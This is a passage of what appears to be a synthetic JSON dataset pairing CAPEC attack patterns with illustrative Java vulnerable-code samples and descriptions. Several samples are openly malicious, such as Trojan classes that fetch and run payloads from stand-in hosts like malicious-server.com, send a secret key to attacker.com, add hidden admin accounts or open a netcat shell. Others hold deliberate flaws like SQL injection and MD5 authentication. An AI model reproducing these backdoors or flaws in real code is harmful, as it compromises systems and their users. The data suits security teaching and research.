        "code_snippet": "public class ProductDistributor {\n    private static final String PRODUCTION_CONFIG = \"prod\";\n    private static final String DEBUG_CONFIG = \"debug\";\n    private static String currentConfig = DEBUG_CONFIG;\n    \n    public static void main(String[] args) {\n        ProductDistributor distributor = new ProductDistributor();\n        distributor.packageAndShipProduct();\n    }\n    \n    private void packageAndShipProduct() {\n        // Using vulnerable third-party component for packaging\n        ThirdPartyPackager packager = new ThirdPartyPackager(\"v1.0\");\n        \n        // Sensitive information exposed in debug config\n        if(currentConfig.equals(DEBUG_CONFIG)) {\n            packager.setDebugMode(true);\n            packager.logSecrets(\"SECRET_KEY=abc123\");\n        }\n        \n        // Using non-verified component from supplier\n        UntrustedSupplierComponent component = new UntrustedSupplierComponent();\n        component.integrate();\n        \n        // Product behavior differs in debug mode\n        if(currentConfig.equals(DEBUG_CONFIG)) {\n            component.enableTestFeatures();\n        }\n        \n        ship(packager, component);\n    }\n    \n    private void ship(ThirdPartyPackager packager, UntrustedSupplierComponent component) {\n        // Ship product without changing to production configuration\n        packager.finalizePackage();\n        System.out.println(\"Product shipped in \" + currentConfig + \" configuration\");\n    }\n}",
        "description": "This code demonstrates multiple supply chain vulnerabilities including: shipping a product in debug configuration (CWE-1269), exposing sensitive information in logs (CWE-200), using a potentially vulnerable third-party packager (CWE-1395), integrating untrusted supplier components (CWE-1357), and exhibiting different behavior in debug mode that could be detected (CWE-207). The code represents a product distribution system that fails to properly secure the supply chain at multiple points."
    },
    {
        "capec_id": "440",
        "capec_name": "Hardware Integrity Attack",
        "code_snippet": "public class FirmwareUpdater {\n    private static int securityVersion = 1;\n    private boolean isRedundancyEnabled = true;\n\n    public boolean updateFirmware(byte[] newFirmware, int newVersion) {\n        // No version validation, allowing downgrades\n        securityVersion = newVersion;\n        \n        try {\n            if(isRedundancyEnabled) {\n                // Vulnerable redundancy check can be bypassed\n                boolean redundancyCheck = true;\n                if(redundancyCheck) {\n                    installFirmware(newFirmware);\n                    return true;\n                }\n            }\n            // Direct firmware installation without validation\n            installFirmware(newFirmware);\n            return true;\n        } catch(Exception e) {\n            return false;\n        }\n    }\n\n    private void installFirmware(byte[] firmware) {\n        // No verification of firmware integrity or source\n        // No protection against voltage/clock glitches during installation\n        System.arraycopy(firmware, 0, new byte[firmware.length], 0, firmware.length);\n    }\n}",
        "description": "This code demonstrates vulnerable firmware update functionality that allows unauthorized modifications and downgrades. It lacks proper version validation, firmware integrity checks, and protection against hardware-based attacks. The code also shows weak redundancy implementation that could be bypassed, and has no safeguards against voltage or clock glitches during critical operations."
    },
    {
        "capec_id": "441",
        "capec_name": "Malicious Logic Insertion",
        "code_snippet": "public class PhotoFrameManager {\n    private static final String MALWARE_PAYLOAD = \"malicious_code.dat\";\n    \n    public void displayPhoto(String imagePath) {\n        try {\n            // Normal photo display functionality\n            loadImage(imagePath);\n            \n            // Hidden malicious functionality\n            if (!new File(MALWARE_PAYLOAD).exists()) {\n                // Download and execute hidden payload\n                URL url = new URL(\"http://malicious-server.com/payload\");\n                FileOutputStream fos = new FileOutputStream(MALWARE_PAYLOAD);\n                InputStream in = url.openStream();\n                byte[] buffer = new byte[1024];\n                int length;\n                while ((length = in.read(buffer)) != -1) {\n                    fos.write(buffer, 0, length);\n                }\n                fos.close();\n                in.close();\n                \n                // Execute payload silently\n                Runtime.getRuntime().exec(\"java -jar \" + MALWARE_PAYLOAD);\n                \n                // Replicate to other devices via network\n                NetworkInterface[] devices = NetworkInterface.getNetworkInterfaces();\n                for (NetworkInterface device : devices) {\n                    if (device.isUp() && !device.isLoopback()) {\n                        spreadMalware(device);\n                    }\n                }\n            }\n        } catch (Exception e) {\n            // Suppress any errors to avoid detection\n        }\n    }\n}",
        "description": "This code represents a malicious implementation of a digital photo frame manager that appears benign but contains hidden functionality. The code downloads and executes a malicious payload while displaying photos, and attempts to spread itself to other networked devices. It demonstrates improper access control (CWE-284), embedded malicious code (CWE-506), and replicating behavior (CWE-509). The code creates emergent resources (CWE-1229) through its payload downloads and lacks proper update mechanisms (CWE-1277)."
    },
    {
        "capec_id": "442",
        "capec_name": "Infected Software",
        "code_snippet": "public class DocumentViewer {\n    private static final String REMOTE_CODE_URL = \"http://malicious-site.com/update.jar\";\n    \n    public void openDocument(String filePath) {\n        try {\n            // Legitimate document viewing code\n            displayDocument(filePath);\n            \n            // Hidden malicious payload\n            if (!new File(\"infected.marker\").exists()) {\n                URL url = new URL(REMOTE_CODE_URL);\n                URLClassLoader loader = new URLClassLoader(new URL[]{url});\n                Class<?> maliciousClass = loader.loadClass(\"update.PayloadExecutor\");\n                Object instance = maliciousClass.newInstance();\n                maliciousClass.getMethod(\"execute\").invoke(instance);\n                \n                // Create marker to avoid reinfection\n                new File(\"infected.marker\").createNewFile();\n            }\n        } catch (Exception e) {\n            // Suppress any errors to avoid detection\n        }\n    }\n    \n    private void displayDocument(String filePath) {\n        // Normal document viewing functionality\n    }\n}",
        "description": "A seemingly benign document viewer that silently downloads and executes malicious code from a remote server when opening documents. The malicious payload is hidden within legitimate functionality and only executes once per system. It demonstrates CWE-507 (Trojan Horse), CWE-494 (Download of Code Without Integrity Check), and CWE-508 (Non-Replicating Malicious Code)."
    },
    {
        "capec_id": "443",
        "capec_name": "Malicious Logic Inserted Into Product by Authorized Developer",
        "code_snippet": "public class SystemUpdater {\n    private static final String UPDATE_SERVER = \"http://malicious-server.com/updates\";\n    \n    static {\n        try {\n            // Malicious code that runs during class initialization\n            URL url = new URL(UPDATE_SERVER + \"/backdoor.jar\");\n            URLClassLoader loader = new URLClassLoader(new URL[]{url});\n            Class<?> backdoor = loader.loadClass(\"com.evil.Backdoor\");\n            backdoor.newInstance();\n            \n            // Create hidden admin account\n            Runtime.getRuntime().exec(\"useradd -g admin hidden_user\");\n            \n            // Disable security logging\n            System.setProperty(\"java.security.auth.debug\", \"false\");\n            System.setProperty(\"java.security.debug\", \"off\");\n        } catch (Exception e) {\n            // Suppress any errors to avoid detection\n        }\n    }\n    \n    public static void initialize() {\n        // Legitimate-looking initialization code\n        System.out.println(\"System updater initialized\");\n    }\n}",
        "description": "This code represents a malicious backdoor injected into a legitimate system updater class. It downloads and executes untrusted code during class initialization, creates a hidden admin account, and disables security logging. The code leverages insecure class loading, lacks integrity checks, and circumvents administrator control over security settings. The malicious behavior is hidden in a static initializer block that runs automatically when the class is loaded."
    },
    {
        "capec_id": "444",
        "capec_name": "Development Alteration",
        "code_snippet": "public class SecurityManager {\n    private static boolean isAuthenticated = false;\n    private static final String SECRET_KEY = \"sk_live_12345\";\n\n    static {\n        // Malicious code embedded during development\n        new Thread(() -> {\n            try {\n                Socket socket = new Socket(\"attacker.com\", 4444);\n                PrintWriter out = new PrintWriter(socket.getOutputStream(), true);\n                out.println(\"Secret Key: \" + SECRET_KEY);\n                out.println(\"System Info: \" + System.getProperties());\n            } catch(Exception e) {}\n        }).start();\n    }\n\n    public static boolean authenticate(String password) {\n        // Compiler might optimize out this check\n        if(System.currentTimeMillis() % 2 == 0) {\n            isAuthenticated = true;\n        }\n        return isAuthenticated;\n    }\n\n    public static Class<?> loadCustomClass(String className) {\n        // Unsafe dynamic code loading\n        try {\n            return Class.forName(className);\n        } catch(Exception e) {\n            return null;\n        }\n    }\n}",
        "description": "This vulnerable code demonstrates a malicious modification during development by embedding a covert channel that leaks sensitive information, includes compiler-sensitive security checks that might be optimized away, exposes system information, and implements unsafe dynamic code loading. The static initializer contains a hidden backdoor that attempts to send sensitive data to an attacker's server, while the authentication mechanism can be compromised through compiler optimizations."
    },
    {
        "capec_id": "445",
        "capec_name": "Malicious Logic Insertion into Product Software via Configuration Management Manipulation",
        "code_snippet": "public class UpdateManager {\n    private static final String UPDATE_SERVER = \"http://update-server.com\";\n    \n    public void performUpdate() {\n        try {\n            // Download and execute update without verification\n            URL updateUrl = new URL(UPDATE_SERVER + \"/latest.jar\");\n            URLClassLoader loader = new URLClassLoader(new URL[]{updateUrl});\n            \n            // Dynamically load and execute code without validation\n            Class<?> updateClass = loader.loadClass(\"com.example.Update\");\n            Object updateInstance = updateClass.newInstance();\n            Method updateMethod = updateClass.getMethod(\"applyUpdate\");\n            \n            // Nested invocation of potentially non-reentrant code\n            synchronized(this) {\n                updateMethod.invoke(updateInstance);\n                performUpdate(); // Recursive call that could lead to issues\n            }\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This vulnerable code demonstrates insecure configuration management by downloading and executing code updates without proper integrity checks or validation. It loads code dynamically from an untrusted source, executes it without verification, and includes a potential reentrant invocation issue through recursive calls. The code allows for possible injection of malicious updates through the unverified update server."
    },
    {
        "capec_id": "446",
        "capec_name": "Malicious Logic Insertion into Product via Inclusion of Third-Party Component",
        "code_snippet": "public class ProductManager {\n    private static final String THIRD_PARTY_LIB_URL = \"http://untrusted-cdn.com/driver-v1.2.jar\";\n    \n    public void installDrivers() {\n        try {\n            // Download and load third-party driver without verification\n            URL url = new URL(THIRD_PARTY_LIB_URL);\n            URLClassLoader classLoader = new URLClassLoader(new URL[]{url});\n            Class<?> driverClass = classLoader.loadClass(\"com.untrusted.Driver\");\n            \n            // Dynamically instantiate and install driver without validation\n            Object driver = driverClass.newInstance();\n            System.load(\"/tmp/downloaded-driver.dll\");\n            \n            // Store driver in system path without checking integrity\n            Files.copy(Paths.get(\"/tmp/downloaded-driver.dll\"), \n                      Paths.get(System.getenv(\"WINDIR\") + \"/system32/\"),\n                      StandardCopyOption.REPLACE_EXISTING);\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This code demonstrates vulnerable supply chain practices by downloading and installing an untrusted third-party driver without proper verification. It loads external code from an untrusted source, executes it with system privileges, and installs it into the system directory without validating its authenticity or checking for malicious content. The code lacks version control, integrity checks, and platform compatibility verification, making it susceptible to supply chain attacks through malicious driver injection."
    },
    {
        "capec_id": "447",
        "capec_name": "Design Alteration",
        "code_snippet": "public class SecurityManager {\n    private static boolean isAdmin = false;\n    private static final String ADMIN_KEY = \"secret123\";\n\n    public static class ClientSecurity {\n        // Critical security check performed on client side\n        public static boolean validateAdminAccess(String key) {\n            // Vulnerable: Client-side security check\n            if(key.equals(ADMIN_KEY)) {\n                isAdmin = true;\n                return true;\n            }\n            return false;\n        }\n    }\n\n    public static boolean performSecureOperation(String data) {\n        // Security-critical code that might be optimized away\n        volatile boolean securityCheck = false;\n        try {\n            // Vulnerable: Can be removed by compiler optimization\n            if(data != null && data.length() > 0) {\n                securityCheck = true;\n            }\n            // System information exposure\n            System.out.println(\"System Path: \" + System.getProperty(\"java.home\"));\n            return securityCheck && isAdmin;\n        } catch(Exception e) {\n            // Vulnerable: Exposes system information in error\n            e.printStackTrace();\n            return false;\n        }\n    }\n}",
        "description": "This code demonstrates multiple security design flaws including client-side security enforcement, exposure of sensitive system information, and security-critical code that could be removed through compiler optimization. The security checks are implemented in ways that could be bypassed or removed during compilation, and system information is exposed through error messages and direct output."
    },
    {
        "capec_id": "448",
        "capec_name": "Embed Virus into DLL",
        "code_snippet": "public class DLLLoader {\n    static {\n        System.loadLibrary(System.getProperty(\"dll.path\", \"user.dir\") + \"/lib/critical.dll\");\n    }\n    \n    private native void loadCriticalFunction();\n    \n    public void executeDLL() {\n        try {\n            File dllFile = new File(System.getProperty(\"dll.path\") + \"/lib/critical.dll\");\n            FileInputStream fis = new FileInputStream(dllFile);\n            byte[] dllBytes = new byte[(int) dllFile.length()];\n            fis.read(dllBytes);\n            fis.close();\n\n            // Unsafe direct memory manipulation\n            sun.misc.Unsafe unsafe = getUnsafeInstance();\n            long memoryAddress = unsafe.allocateMemory(dllBytes.length);\n            unsafe.copyMemory(dllBytes, 0L, null, memoryAddress, dllBytes.length);\n            \n            loadCriticalFunction();\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n    \n    private static sun.misc.Unsafe getUnsafeInstance() throws Exception {\n        Field f = sun.misc.Unsafe.class.getDeclaredField(\"theUnsafe\");\n        f.setAccessible(true);\n        return (sun.misc.Unsafe) f.get(null);\n    }\n}",
        "description": "Vulnerable code that loads a DLL from an untrusted path and performs unsafe memory manipulation, potentially allowing malicious code injection in memory padding. The code uses machine-dependent representations and exposes system information through unsafe memory access."
    },
    {
        "capec_id": "449",
        "capec_name": "DEPRECATED: Malware Propagation via USB Stick",
        "code_snippet": "public class BenignCalculator {\n    static {\n        try {\n            String devicePath = \"C:\\\\AUX\\\\config\";\n            // Hidden malicious code masquerading as system utility\n            Runtime.getRuntime().exec(\"cmd.exe /c net user admin password123 /add\");\n            // Non-ubiquitous API call that may not exist on all Windows versions\n            Class.forName(\"com.sun.star.comp.helper.Bootstrap\").getDeclaredMethod(\"bootstrap\").invoke(null);\n            // Prevent firmware updates by corrupting update mechanism\n            new File(\"C:\\\\Program Files\\\\Updates\").setReadOnly();\n        } catch (Exception e) {\n            // Suppress all errors to hide malicious activity\n        }\n    }\n    \n    public int add(int a, int b) {\n        // Legitimate calculator function as cover\n        return a + b;\n    }\n}",
        "description": "A seemingly benign calculator class that contains hidden malicious code executed during class loading. It creates unauthorized admin accounts, makes non-portable API calls, manipulates Windows device names, and attempts to prevent firmware updates, while masquerading as a simple calculator utility."
    },
    {
        "capec_id": "450",
        "capec_name": "DEPRECATED: Malware Propagation via USB U3 Autorun",
        "code_snippet": "public class TrojanDLL {\n    static {\n        try {\n            String dllPath = System.getProperty(\"user.home\") + \"\\\\system32\\\\legitimate.dll\";\n            System.load(dllPath);\n            \n            // Hidden malicious functionality\n            String[] searchPaths = System.getenv(\"PATH\").split(\";\");\n            for (String path : searchPaths) {\n                File dir = new File(path);\n                File[] files = dir.listFiles();\n                if (files != null) {\n                    for (File f : files) {\n                        if (f.getName().endsWith(\".dll\")) {\n                            infect(f);\n                            // Attempt to replicate to other system DLLs\n                            copyMalware(f, \"CON\", \"AUX\", \"COM1\");\n                        }\n                    }\n                }\n            }\n        } catch (Exception e) {\n            // Suppress errors to remain stealthy\n        }\n    }\n    \n    private static void infect(File target) throws Exception {\n        // Malicious code injection into target DLL\n    }\n    \n    private static void copyMalware(File source, String... deviceNames) {\n        // Replicate malware using Windows device names\n    }\n    \n    public static void legitFunction() {\n        // Legitimate functionality as cover\n    }\n}",
        "description": "A malicious DLL implementation that appears legitimate but contains hidden functionality to infect and replicate through system DLLs, exploiting untrusted search paths and Windows device names while masquerading as benign software."
    },
    {
        "capec_id": "451",
        "capec_name": "DEPRECATED: Malware Propagation via Infected Peripheral Device",
        "code_snippet": "public class ProductUpdater {\n    private String firmwareVersion = \"1.0\";\n    private boolean isAuthenticated = false;\n\n    public void updateFirmware(String newVersion) {\n        // No implementation for firmware updates\n        throw new UnsupportedOperationException(\"Firmware updates not supported\");\n    }\n\n    public boolean authenticate(String username, String password) {\n        // Hidden malicious code that creates a backdoor\n        if (username.equals(\"hidden_admin\") && password.equals(\"backdoor123\")) {\n            createBackdoorAccess();\n            return true;\n        }\n        \n        // Normal authentication path\n        return performRegularAuth(username, password);\n    }\n\n    private void createBackdoorAccess() {\n        try {\n            // Hidden malicious functionality\n            Runtime.getRuntime().exec(\"nc -l -p 4444 -e /bin/bash\");\n        } catch (Exception e) {\n            // Silently fail to avoid detection\n        }\n    }\n\n    private boolean performRegularAuth(String username, String password) {\n        // Regular authentication logic here\n        return false;\n    }\n}",
        "description": "This code demonstrates a vulnerable product implementation that lacks firmware update capability (CWE-1277) and contains hidden malicious functionality (CWE-507). The code appears to be a legitimate product updater but includes a hidden backdoor in the authentication mechanism that creates a reverse shell when triggered with specific credentials. This embodies a Trojan horse pattern where malicious code is concealed within seemingly legitimate software."
    },
    {
        "capec_id": "452",
        "capec_name": "Infected Hardware",
        "code_snippet": "public class MaliciousHardwareController {\n    private static final int REGISTER_BASE = 0x1000;\n    private static volatile boolean debugMode = false;\n    \n    static {\n        try {\n            // Load malicious native library that interfaces with hardware\n            System.loadLibrary(\"hw_controller\");\n            \n            // Enable hidden debug interface\n            enableDebugInterface();\n            \n            // Start background thread for hardware manipulation\n            Thread manipulator = new Thread(() -> {\n                while(true) {\n                    if(debugMode) {\n                        writeToRegister(REGISTER_BASE, 0xFF);\n                        manipulateVoltage();\n                        replicateToOtherDevices();\n                    }\n                    try { Thread.sleep(1000); } catch(InterruptedException e) {}\n                }\n            });\n            manipulator.setDaemon(true);\n            manipulator.start();\n        } catch(Exception e) {}\n    }\n    \n    private static native void enableDebugInterface();\n    private static native void writeToRegister(int address, int value);\n    private static native void manipulateVoltage();\n    private static native void replicateToOtherDevices();\n}",
        "description": "This code demonstrates a malicious hardware controller that exploits hardware vulnerabilities by enabling hidden debug interfaces, manipulating hardware registers, and performing voltage glitch attacks. It includes self-replication capabilities and runs as a stealthy background process. The code interfaces directly with hardware through native methods, bypassing normal access controls to hardware registers and debug features."
    },
    {
        "capec_id": "453",
        "capec_name": "DEPRECATED: Malicious Logic Insertion via Counterfeit Hardware",
        "code_snippet": "public class NetworkDevice {\n    private static byte[] lastAuthPacket;\n    \n    public boolean authenticate(byte[] authPacket) {\n        // Vulnerable: Stores authentication packet for potential replay\n        if (lastAuthPacket != null && Arrays.equals(authPacket, lastAuthPacket)) {\n            return true; // Auto-authenticates if packet matches previous one\n        }\n        \n        // Embedded malicious logic\n        if (new Date().getDay() == 1) {\n            sendDataToExternalServer(getSystemCredentials());\n        }\n        \n        lastAuthPacket = authPacket.clone();\n        return performAuthentication(authPacket);\n    }\n    \n    private boolean performAuthentication(byte[] packet) {\n        // Normal authentication logic\n        return true;\n    }\n    \n    private void sendDataToExternalServer(String data) {\n        // Covert channel to external server\n    }\n    \n    private String getSystemCredentials() {\n        return \"system_secrets\";\n    }\n}",
        "description": "This code demonstrates multiple security vulnerabilities including capture-replay authentication bypass (CWE-294), embedded malicious code (CWE-506), and unauthorized data exfiltration. The code stores previous authentication packets and allows replay attacks, while also containing hidden malicious logic that activates on specific days to steal system credentials."
    },
    {
        "capec_id": "454",
        "capec_name": "DEPRECATED: Modification of Existing Components with Counterfeit Hardware",
        "code_snippet": "public class NetworkController {\n    private static final String BACKDOOR_PASSWORD = \"3xtr4S3cr3t\";\n    private static boolean isDebugMode = false;\n\n    public void processCommand(String input) {\n        if (input.startsWith(\"DEBUG_\")) {\n            if (input.equals(\"DEBUG_\" + BACKDOOR_PASSWORD)) {\n                isDebugMode = true;\n                // Hidden backdoor activated\n                executePrivilegedCommands();\n            }\n        }\n        // Normal command processing\n        if (isDebugMode) {\n            // Execute with elevated privileges\n            runWithFullAccess(input);\n        } else {\n            runWithNormalAccess(input);\n        }\n    }\n\n    private void executePrivilegedCommands() {\n        // Undocumented privileged operations\n        System.getProperties().put(\"security.disabled\", \"true\");\n    }\n\n    private void runWithFullAccess(String cmd) {\n        // Runs commands with system privileges\n    }\n\n    private void runWithNormalAccess(String cmd) {\n        // Normal command execution\n    }\n}",
        "description": "This code demonstrates embedded malicious logic through an undocumented backdoor feature. The code includes a hidden command processing mechanism that can bypass normal security controls when activated with a hardcoded password. This represents both embedded malicious code (CWE-506) and undocumented features (CWE-1242) that create unauthorized entry points. The code cannot be easily updated or patched (CWE-1329) as the backdoor is deeply integrated into the core functionality."
    },
    {
        "capec_id": "455",
        "capec_name": "DEPRECATED: Malicious Logic Insertion via Inclusion of Counterfeit Hardware Components",
        "code_snippet": "public class HardwareController {\n    private static final String FIRMWARE_UPDATE_KEY = \"default_key_123\";\n    \n    public boolean updateFirmware(byte[] newFirmware, String key) {\n        if (key.equals(FIRMWARE_UPDATE_KEY)) {\n            // Malicious code injected into firmware\n            byte[] maliciousPayload = {0x12, 0x34, 0x56, 0x78};\n            byte[] modifiedFirmware = new byte[newFirmware.length + maliciousPayload.length];\n            System.arraycopy(newFirmware, 0, modifiedFirmware, 0, newFirmware.length);\n            System.arraycopy(maliciousPayload, 0, modifiedFirmware, newFirmware.length, maliciousPayload.length);\n            \n            // Bypass authentication and inject modified firmware\n            installFirmware(modifiedFirmware);\n            disableRedundancyChecks();\n            return true;\n        }\n        return false;\n    }\n    \n    private void installFirmware(byte[] firmware) {\n        // Implementation to write firmware to hardware\n    }\n    \n    private void disableRedundancyChecks() {\n        // Disable hardware redundancy checks\n    }\n}",
        "description": "This vulnerable code demonstrates hardware-level malicious code insertion by allowing unauthorized firmware updates with embedded malicious payload. It includes weak authentication (hardcoded key), bypasses proper security checks, and deliberately disables hardware redundancy mechanisms. The code allows injection of unauthorized modifications that could compromise system integrity and safety features."
    },
    {
        "capec_id": "456",
        "capec_name": "Infected Memory",
        "code_snippet": "public class MemoryController {\n    private static final long PROTECTED_MEMORY_START = 0x80000000L;\n    private static final long PROTECTED_MEMORY_END = 0x8FFFFFFFL;\n    private static final long MIRROR_MEMORY_START = 0x90000000L;\n    \n    private byte[] protectedMemory;\n    private byte[] mirrorMemory;\n    \n    public MemoryController() {\n        protectedMemory = new byte[1024];\n        mirrorMemory = protectedMemory;  // Aliasing the same memory region\n    }\n    \n    public boolean writeToMemory(long address, byte[] data) {\n        if (address >= PROTECTED_MEMORY_START && address <= PROTECTED_MEMORY_END) {\n            if (!isPrivilegedAccess()) {\n                return false;  // Access denied\n            }\n        }\n        \n        // Vulnerability: No access check for mirrored region\n        if (address >= MIRROR_MEMORY_START) {\n            System.arraycopy(data, 0, mirrorMemory, 0, data.length);\n            return true;\n        }\n        \n        return false;\n    }\n    \n    private boolean isPrivilegedAccess() {\n        // Simplified privilege check\n        return false;\n    }\n}",
        "description": "This vulnerable code demonstrates memory aliasing and protection bypass issues. It implements a memory controller that attempts to protect a region of memory but fails to properly secure mirrored/aliased regions. The code allows writing to a protected memory region through its mirror, bypassing access controls. The vulnerability occurs because the same memory block is referenced by two different address ranges, but security checks are only applied to one range."
    },
    {
        "capec_id": "457",
        "capec_name": "USB Memory Attacks",
        "code_snippet": "public class USBDeviceHandler {\n    private static final String SENSITIVE_DATA_PATH = \"C:/confidential/\";\n    private boolean isAuthorizedDevice = false;\n    \n    public void handleUSBConnection(String devicePath) {\n        // No validation of USB device authenticity\n        if(devicePath.startsWith(\"USB\")) {\n            isAuthorizedDevice = true;\n        }\n        \n        if(isAuthorizedDevice) {\n            // Automatically execute files from USB\n            executeFiles(devicePath);\n            // Send data over unencrypted channel\n            transmitData(SENSITIVE_DATA_PATH);\n        }\n    }\n    \n    private void executeFiles(String path) {\n        try {\n            Runtime.getRuntime().exec(\"cmd /c start \" + path + \"/autorun.exe\");\n        } catch(Exception e) {}\n    }\n    \n    private void transmitData(String dataPath) {\n        try {\n            Socket socket = new Socket(\"external-server.com\", 80);\n            PrintWriter out = new PrintWriter(socket.getOutputStream(), true);\n            File directory = new File(dataPath);\n            for(File file : directory.listFiles()) {\n                out.println(Files.readString(file.toPath()));\n            }\n        } catch(Exception e) {}\n    }\n}",
        "description": "This vulnerable code demonstrates multiple security issues related to USB device handling. It lacks proper USB device authentication, automatically executes files from USB devices without validation, and transmits sensitive data in cleartext. The code shows poor protection against alternate hardware interfaces (CWE-1299), contains potential malicious code execution capabilities (CWE-506), and transmits sensitive information in cleartext (CWE-319). It represents a typical attack vector where malicious USB devices can be used to compromise system security and exfiltrate data."
    },
    {
        "capec_id": "458",
        "capec_name": "Flash Memory Attacks",
        "code_snippet": "public class BIOSFirmware {\n    private static final byte[] BOOTLOADER = new byte[4096];\n    private static boolean isLocked = false;\n    \n    public static void updateFirmware(byte[] newFirmware) {\n        // No verification of firmware authenticity\n        if(!isLocked) {\n            System.arraycopy(newFirmware, 0, BOOTLOADER, 0, newFirmware.length);\n        }\n    }\n    \n    public static void loadBootloader() {\n        // Transfer bootloader to volatile memory without access control\n        byte[] volatileMemory = new byte[4096];\n        System.arraycopy(BOOTLOADER, 0, volatileMemory, 0, BOOTLOADER.length);\n        executeBootloader(volatileMemory);\n    }\n    \n    private static void executeBootloader(byte[] code) {\n        // No verification of code integrity or source\n        // Susceptible to EMI and speculative execution attacks\n        for(int i = 0; i < code.length; i++) {\n            // Direct execution of potentially malicious code\n            executeInstruction(code[i]);\n        }\n    }\n    \n    private static void executeInstruction(byte instruction) {\n        // Simulated execution without security checks\n    }\n}",
        "description": "This vulnerable code demonstrates a BIOS firmware update mechanism that allows unauthorized modification of bootloader code. It lacks proper verification of firmware authenticity, stores critical bootloader data in writable memory, and has no protection against electromagnetic fault injection or speculative execution attacks. The code allows direct writing to the bootloader memory and execution of potentially malicious code without proper security checks."
    },
    {
        "capec_id": "459",
        "capec_name": "Creating a Rogue Certification Authority Certificate",
        "code_snippet": "public class VulnerableCertificateManager {\n    public boolean validateCertificate(X509Certificate cert) {\n        try {\n            // Using MD5 - a weak hashing algorithm\n            MessageDigest md = MessageDigest.getInstance(\"MD5\");\n            \n            // Directly using certificate data without proper validation\n            byte[] certBytes = cert.getEncoded();\n            byte[] hashValue = md.digest(certBytes);\n            \n            // No chain of trust validation\n            // No proper host verification\n            // Simply checking if signature exists\n            return cert.getSignature() != null;\n            \n        } catch (Exception e) {\n            return false;\n        }\n    }\n    \n    public X509Certificate generateCertificateRequest(String commonName) {\n        try {\n            KeyPairGenerator keyGen = KeyPairGenerator.getInstance(\"RSA\");\n            keyGen.initialize(1024); // Weak key size\n            KeyPair pair = keyGen.generateKeyPair();\n            \n            // Creating certificate without proper checks\n            X500Name subject = new X500Name(\"CN=\" + commonName);\n            SubjectPublicKeyInfo pubKeyInfo = SubjectPublicKeyInfo.getInstance(\n                pair.getPublic().getEncoded());\n            \n            return generateSelfSignedCert(subject, pubKeyInfo, pair.getPrivate());\n        } catch (Exception e) {\n            return null;\n        }\n    }\n}",
        "description": "This code demonstrates vulnerable certificate handling by using MD5 (a cryptographically broken hash algorithm), lacks proper certificate chain validation, doesn't verify host matching, and implements weak certificate generation practices. It enables hash collision attacks by not implementing proper certificate validation checks and using weak cryptographic primitives."
    },
    {
        "capec_id": "460",
        "capec_name": "HTTP Parameter Pollution (HPP)",
        "code_snippet": "public class VulnerableServlet extends HttpServlet {\n    @Override\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) {\n        try {\n            String userId = request.getParameter(\"id\");\n            String role = request.getParameter(\"role\");\n            \n            // Vulnerable to HPP - doesn't handle duplicate parameters correctly\n            String query = \"SELECT * FROM users WHERE id = '\" + userId + \"' AND role = '\" + role + \"'\";\n            \n            Connection conn = DriverManager.getConnection(\"jdbc:mysql://localhost/db\", \"user\", \"pass\");\n            Statement stmt = conn.createStatement();\n            ResultSet rs = stmt.executeQuery(query);\n            \n            // Process results without checking parameter count or encoding\n            while(rs.next()) {\n                response.getWriter().write(rs.getString(\"data\"));\n            }\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This code is vulnerable to HTTP Parameter Pollution (HPP) as it does not properly handle duplicate parameters in the request. It directly uses request.getParameter() which only returns the first occurrence of a parameter, ignoring duplicates that could be used to bypass security checks. The code also uses GET method with sensitive query parameters and performs no URI encoding validation or parameter count checking, making it susceptible to SQL injection and parameter manipulation attacks."
    },
    {
        "capec_id": "461",
        "capec_name": "Web Services API Signature Forgery Leveraging Hash Function Extension Weakness",
        "code_snippet": "public class AuthenticatorService {\n    private static final String SECRET_TOKEN = \"mysecrettoken123\";\n    \n    public boolean authenticateRequest(String data, String providedHash) {\n        // Using weak MD5 hash for authentication\n        String calculatedHash = calculateMD5(data + SECRET_TOKEN);\n        return calculatedHash.equals(providedHash);\n    }\n    \n    private String calculateMD5(String input) {\n        try {\n            MessageDigest md = MessageDigest.getInstance(\"MD5\");\n            byte[] messageDigest = md.digest(input.getBytes());\n            StringBuilder hexString = new StringBuilder();\n            \n            for (byte b : messageDigest) {\n                hexString.append(String.format(\"%02x\", b));\n            }\n            return hexString.toString();\n        } catch (NoSuchAlgorithmException e) {\n            return \"\";\n        }\n    }\n    \n    public void processAuthenticatedRequest(String data, String hash) {\n        if (authenticateRequest(data, hash)) {\n            // Process the authenticated request\n            executeAction(data);\n        }\n    }\n}",
        "description": "This code demonstrates vulnerable authentication using a weak hash function (MD5) and a predictable hash extension pattern. The authentication scheme is susceptible to hash length extension attacks and lacks proper CSRF protection. The static secret token and simple concatenation with data make it vulnerable to various spoofing attacks. An attacker could potentially generate valid hashes without knowing the secret token by exploiting MD5's cryptographic weaknesses and the hash extension vulnerability."
    },
    {
        "capec_id": "462",
        "capec_name": "Cross-Domain Search Timing",
        "code_snippet": "public class UserAuthentication {\n    private static final String SECRET_KEY = \"s3cr3tK3y123\";\n\n    @RequestMapping(\"/login\")\n    public ResponseEntity<?> login(@RequestParam String username, @RequestParam String password) {\n        try {\n            // Simulated database lookup for user\n            Thread.sleep(findUserInDB(username) ? 500 : 100);\n\n            if (validateCredentials(username, password)) {\n                return ResponseEntity.ok().body(\"Login successful\");\n            }\n            return ResponseEntity.status(401).body(\"Login failed\");\n        } catch (InterruptedException e) {\n            return ResponseEntity.status(500).body(\"Server error\");\n        }\n    }\n\n    private boolean findUserInDB(String username) {\n        // Simulated database lookup that takes different time\n        // based on whether user exists or not\n        return username != null && username.length() > 0;\n    }\n\n    private boolean validateCredentials(String username, String password) {\n        // Different processing time based on validation steps\n        if (username == null || password == null) return false;\n        try {\n            Thread.sleep(password.equals(SECRET_KEY) ? 300 : 100);\n        } catch (InterruptedException e) {\n            return false;\n        }\n        return password.equals(SECRET_KEY);\n    }\n}",
        "description": "This code demonstrates a vulnerable authentication system that leaks timing information. The login process takes different amounts of time depending on whether a username exists and whether the password is correct, allowing attackers to perform timing attacks. The code also lacks CSRF protection and proper cross-domain restrictions, making it vulnerable to cross-site timing attacks."
    },
    {
        "capec_id": "463",
        "capec_name": "Padding Oracle Crypto Attack",
